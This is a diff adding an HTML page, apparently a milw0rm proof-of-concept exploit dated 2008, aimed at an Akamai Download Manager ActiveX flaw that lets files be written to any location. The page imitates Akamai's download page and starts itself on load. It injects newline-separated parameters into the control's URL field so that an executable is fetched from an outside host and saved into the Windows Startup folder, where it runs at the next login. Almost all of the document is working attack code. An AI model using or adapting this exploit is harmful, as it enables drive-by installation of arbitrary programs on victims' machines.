@@ -1,0 +1,303 @@
+<html>
+        
+
+    <!--
+
+	/**********************************************************************************
+	Exploit start here, by cocoruder(frankruder_at_hotmail.com)
+	For "Akamai Download Manager File Download To Arbitrary Location Vulnerability".         
+
+	This exploit will download "http://ruder.cdut.net/attach/calc.exe" to "C:\\Documents and Settings\\All Users\\Start Menu\\Programs\\Startup\\calc_run.exe".
+	***********************************************************************************/
+
+        
+                
+        DLM:       v2.2.3
+        Received:  ActiveX, v2.2.3.5
+        Reason:    MSIE 6
+        Language:  en (Automatically detected)
+                
+            
+    -->
+
+    <head>
+
+        <!-- Begin head fragment -->
+
+        
+            
+                
+  <title>Download Manager</title> 
+  <script TYPE="text/javascript" LANGUAGE="javascript">
+  window.resizeTo(500,510);
+  </script>
+
+            
+
+        <!-- End head fragment -->
+
+        <script language="JavaScript">
+
+            var bDocReady = false;
+            var bInsObj   = false;
+            var isLinux   = (navigator.userAgent.indexOf("Linux") >= 0);
+            var isMacFF   = (navigator.userAgent.indexOf("Firefox") >= 0 && navigator.userAgent.indexOf("Mac") >= 0);
+            var isSafari  = (navigator.userAgent.indexOf("Safari") >= 0);
+            var isSolaris = (navigator.userAgent.indexOf("Sun") >= 0);
+            var isWinFF   = (navigator.userAgent.indexOf("Firefox") >= 0 && navigator.userAgent.indexOf("Windows") >= 0);
+            var isIE7     = (navigator.userAgent.indexOf("MSIE 7") >= 0);
+
+            function doLoad() {
+        
+                // Start automatically
+                setTimeout("startDLM();", 1000);
+            
+                return;
+            }
+
+        
+                
+
+            var bdmIsReady = false;
+            var bDMStarted = false;
+            var bDMFailed  = false;
+            var bShutdown  = false;
+
+            var startTries = 0;
+
+            function closeIt() {
+                if (isIE7) {
+                        return;
+                }
+
+                if (bDMStarted && !bShutdown) {
+                    event.returnValue = "The Download Manager is still running.\n" +
+                        "Pressing 'OK' will stop any active downloads and close the Download Manager.";
+                }
+            }
+
+            
+
+        </script>
+
+        
+        <noscript><meta http-equiv="Refresh" content="2;url=http://dlm.tools.akamai.com/tools_files/Readme.txt" /></noscript>
+            
+
+    </head>
+
+    <body onload="doLoad()" onbeforeunload="closeIt()">
+
+        <!-- Begin body fragment -->
+
+        
+            
+                
+                    
+                        <table cellpadding="10" cellspacing="0" border="0">
+<tr><td>
+<strong>About the Download Manager</strong><br>
+<p>The Download Manager provides for more effective, more efficient file downloads than you normally see with your browser, especially for large files or file sets.  It can pause and restart downloads even if you turn your computer off and on again. You will be presented with a security warning and after you accept, the Download Manager will install and begin to download the requested file.</p>	
+<p>Should the Download Manager fail to start, or if you do not accept the security certificate, you can <a href=http://dlm.tools.akamai.com/tools_files/Readme.txt>click here</a> to download the file without using the download manager.</p><p/>
+</td></tr>
+</table>
+
+                    
+            
+
+        <!-- End body fragment -->
+
+        <DIV ID="objectDIV"></DIV>
+
+        <script language="JavaScript">
+
+        
+                
+
+            // Initiate shutdown
+            function doDLMShutdown() {
+                if (bShutdown) {
+                    return;
+                }
+
+                bShutdown = true;
+                window.opener = null;
+                window.close();
+            }
+
+
+            // Initiate the download
+            function doStart() {
+                startTries++;
+                if (startTries > 120) {
+                    bDMFailed = true;
+                    return;
+                }
+
+                try {
+                    var dm = document.getElementById("dm");
+                    if (dm == null) {
+                        bDMFailed = true;
+                        return;
+                    }
+                    dm.detachEvent("DLMShutdown", doDLMShutdown);
+                    dm.attachEvent("DLMShutdown", doDLMShutdown);
+                
+                    
+                    dm.StartDownload();
+                    
+                    bDMStarted = true;
+                } catch (e) {
+                    bDMStarted = false;
+                    if (e.description != "object Error") {
+                        bDMFailed = true;
+                    }
+                }
+            }
+
+            // Start the DLM
+            function startDLM() {
+
+				//alert("pause");
+
+                if (bDocReady) {
+                    insertObj();
+                    if (bdmIsReady) {
+                        doStart();
+                    }
+                }
+
+                if (bDMFailed) {
+                    // Don't try to go direct, since this happens by
+                    // default on XP SP2 and above.
+                    return;
+                }
+
+                if (!bDMStarted) {
+                    setTimeout("startDLM();", 500);
+                }
+            }
+
+            // Check if the DM object is fully loaded
+            function dmReady() {
+                var dm = document.getElementById("dm");
+                if (dm == null) {
+                    bDMFailed = true;
+                    return;
+                }
+
+                if (dm.readyState == 4) {
+                    bdmIsReady = true;
+                }
+            }
+            
+
+            // Check if the document is fully loaded
+            function docReady() {
+                if (document.readyState == "complete") {
+                    bDocReady = true;
+                } else {
+                    bDocReady = false;
+                }
+            }
+
+            // Insert the code to create the DM object
+            function insertObj() {
+                // Only insert the object once
+                if (!bInsObj) {
+                    bInsObj = true;
+
+                    // Create object tag
+        
+                
+                    var sObjHTML = "<object id=\"dm\" classid=\"CLSID:4871A87A-BFDD-4106-8153-FFDE2BAC2967\" CODEBASE=\"http://dlm.tools.akamai.com/dlmanager/versions/activex/dlm-activex-2.2.3.5.cab#Version=2,2,3,5\" width=1 height=1> " +
+                        "   <PARAM name=\"logging\" value=\"1\"/> " +
+            
+                        "    <PARAM name=\"version\" value=\"2.2.3\"/> " +
+
+
+
+						/**********************************************************************************
+						Exploit start here, by cocoruder(frankruder_at_hotmail.com)
+						For "Akamai Download Manager File Download To Arbitrary Location Vulnerability".         
+
+						This exploit will download "http://ruder.cdut.net/attach/calc.exe" to "C:\\Documents and Settings\\All Users\\Start Menu\\Programs\\Startup\\calc_run.exe".
+						***********************************************************************************/
+
+                        "    <PARAM name=\"URL\" value=\"http://ruder.cdut.net/attach/calc.exe\x0Areferer=http://ruder.cdut.net\x0Amd5=\x0Atarget=C:\\Documents and Settings\\All Users\\Start Menu\\Programs\\Startup\\calc_run.exe\x0AlogoURL=\x0AiconURL=\x0AproviderName=\x0Alaunch=\x0AcloseWhenDone=yes\x0Aresumable=\x0AdisregardQryStr=\x0AmaxCon=4\x0AinitialView=summary\x0AxPos=100\x0AyPos=100\x0Aicon=true\x0Aencrypt=\x0Alogging=1\x0AfgColor=\x0AbgColor=\x0ArecoveryUrl=http://dlm.tools.akamai.com/Readme.txt\x0AflushSize=32\x0Alanguage=en\x0AuseMD5=\x0AuseStateReporting=1\x0AbundleDetails=\x0AbundleEnabled=\x0ArequestSize=1024\x0AswooshEnabled=\x0AswooshInstall=\x0Acookie=\"/> " +
+
+
+
+                        "    <PARAM name=\"recoveryURL\" value=\"http://dlm.tools.akamai.com/Readme.txt\"/> " +
+                        "    <PARAM name=\"language\" value=\"en\"/> " +
+                        "    <PARAM name=\"providerName\" value=\"\"/> " +
+                        "    <PARAM name=\"maxCon\" value=\"4\"/> " +
+                        "    <PARAM name=\"maxConn\" value=\"4\"/> " +
+                        "    <PARAM name=\"requestSize\" value=\"1024\"/> " +
+                        "    <PARAM name=\"flushSize\" value=\"32\"/> " +
+        
+            
+                        "    <PARAM name=\"initialView\" value=\"summary\"/> " +
+            
+        
+        
+                        "    <PARAM name=\"icon\" value=\"true\"/> " +
+            
+        
+        
+        
+        
+        
+                        "    <PARAM name=\"launch\" value=\"no\"/> " +
+            
+        
+                        "    <PARAM name=\"closeWhenDone\" value=\"no\"/> " +
+            
+        
+        
+
+        
+
+        
+                        "</object> ";
+            
+
+                    objdiv = document.getElementById("objectDIV");
+                    if (objdiv == null) {
+        
+                        document.location.replace("http://dlm.tools.akamai.com/tools_files/Readme.txt");
+            
+                        return;
+                    }
+
+        
+
+                    objdiv.innerHTML = sObjHTML;
+
+                    if (dm == null) {
+                        bDMFailed = true;
+                    }
+
+                    // Set up handler for DM readystate change
+                    dm.onreadystatechange = dmReady;
+                    dmReady();
+
+            
+
+                }
+            }
+
+        
+
+            // Set up handler for document readystate change
+            document.onreadystatechange = docReady;
+
+            
+
+        </script>
+
+    </body>
+
+</html>
+
+# milw0rm.com [2008-06-04]
